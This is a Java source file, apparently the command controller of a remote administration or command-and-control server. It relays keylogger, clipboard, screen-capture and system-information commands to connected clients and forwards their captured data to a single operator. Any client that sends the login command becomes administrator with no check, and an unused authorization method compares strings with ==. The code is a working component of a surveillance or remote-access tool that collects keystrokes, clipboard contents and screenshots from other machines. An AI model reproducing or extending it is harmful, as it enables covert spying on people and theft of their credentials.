package controllers;

import models.ClientSocketModel;
import models.MessageModel;
import models.SocketModel;
import org.json.JSONArray;
import org.json.JSONObject;
import server.Server;
import utils.JSON;
import utils.console;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;

import static utils.Command.*;
import static utils.Command.COMMAND_CLIENT_SCREEN;
import static utils.Environment.*;

public class Controller {
    public static Map<String, Executable<JSON>> controller = new HashMap();

    public static void init() {
        put(COMMAND_LOGIN, Controller::getLogin);
        put(COMMAND_BROADCAST, Controller::getBroadcast);
        put(COMMAND_MONITORING, Controller::getMonitoring);
        put(COMMAND_GET_ALL_CLIENTS, Controller::getAllClients);
        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
        put(COMMAND_CLIPBOARD, Controller::getClipboard);
        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
        put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
    }

    private static void getScreen(JSON json, SocketModel model) {
        if (json.get("uuid").equals(Server.getHost().getUUID())) {
            String temp = new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_CLIENT_SCREEN).json();
            ClientSocketModel client = Server.getClientConnections().get(json.get("to"));
            if (client != null) {
                client.onSend(temp);
                return;
            }
            model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
            return;
        }
//        JSONArray tmp = new JSONArray(json.get("image"));
//        int length = tmp.length();
//        console.log(length + "");
//
//        byte[] arr = new byte[length];
//        for (int i = 0; i < length; i++) {
//            System.out.println(Byte.valueOf(tmp.get(i).toString()));
//            arr[0] = Byte.parseByte(tmp.get(i).toString());
//        }
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        try {
//            byteArrayOutputStream.write(arr);
//        } catch (IOException e) {
//            throw new RuntimeException(e);
//        }
        Server.getHost().onSend(json.toString());
    }

    private static void getKeylogger(JSON json, SocketModel model) {
        if (json.get("uuid").equals(Server.getHost().getUUID())) {
            Server.getClientConnections().get(json.get("to")).onSend(new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_KEYLOGGER).json());
            return;
        }

        Server.getHost().onSend(json.toString());
    }

    private static void getClipboard(JSON json, SocketModel model) {
        if (json.get("uuid").equals(Server.getHost().getUUID())) {
            Server.getClientConnections().get(json.get("to")).onSend(new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_CLIPBOARD).json());
            return;
        }

        Server.getHost().onSend(json.toString());
    }

    private static void getMonitoring(JSON json, SocketModel model) {
        if (json.get("uuid").equals(Server.getHost().getUUID())) {
            String temp = new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_MONITORING).json();
            ClientSocketModel client = Server.getClientConnections().get(json.get("to"));
            if (client != null) {
                client.onSend(temp);
                return;
            }
            model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
            return;
        }

        Server.getHost().onSend(new MessageModel(DEFAULT_SERVER_HOST, DEFAULT_SERVER_HOST, COMMAND_MONITORING)
                .put("ram", json.get("ram"))
                .put("cpu", json.get("cpu"))
                .put("disk", json.get("disk"))
                .json());
    }

    private static void getClientSystemInfo(JSON json, SocketModel model) {
        String uuid = model.getUUID();
        ClientSocketModel client = Server.getClientConnections().get(uuid);
        JSON result = new JSON(json.get("result"));
        client.setRam(result.get("ram"));
        client.setCpu(result.get("ram"));
        client.setDisk(result.get("disk"));
        client.setOs(result.get("os"));
        client.setIp(result.get("ip"));
        client.setMAC_address(result.get("MAC_address"));
        client.setHostName(result.get("hostName"));
        console.log("Client[" + uuid + "] updated system info!");
    }

    private static void getLogin(JSON json, SocketModel model) {
        String uuid = model.getUUID();
        Server.setHost(uuid);
        console.warn("Client[" + uuid + "] is now a Administrator");
    }

    private static void getAllClients(JSON json, SocketModel model) {
        String temp = new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_GET_ALL_CLIENTS).put("clients", Server.getClientConnections().values()).json();
        model.onSend(temp);
    }

    private static void getBroadcast(JSON json, SocketModel model) {
        String uuid = model.getUUID();
        String message = json.get(MESSAGE);
        String response = new MessageModel(DEFAULT_SERVER_HOST, uuid, COMMAND_RESPONSE).put(MESSAGE, message).json();
        Server.getClientConnections().values().forEach(client -> {
            client.onSend(response);
        });
    }

    private static boolean isAuthorized(String uuid) {
        try {
            return uuid == Server.getHost().getUUID();
        } catch (NullPointerException e) {
            return false;
        }
    }

    private static String getNotFoundController(JSON json, SocketModel model) {
        return new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), NOT_FOUND_CONTROLLER).json();
    }

    public static Executable get(String key) {
        return controller.getOrDefault(key, Controller::getNotFoundController);
    }

    public static Executable put(String key, Executable<JSON> value) {
        return controller.put(key, value);
    }
}
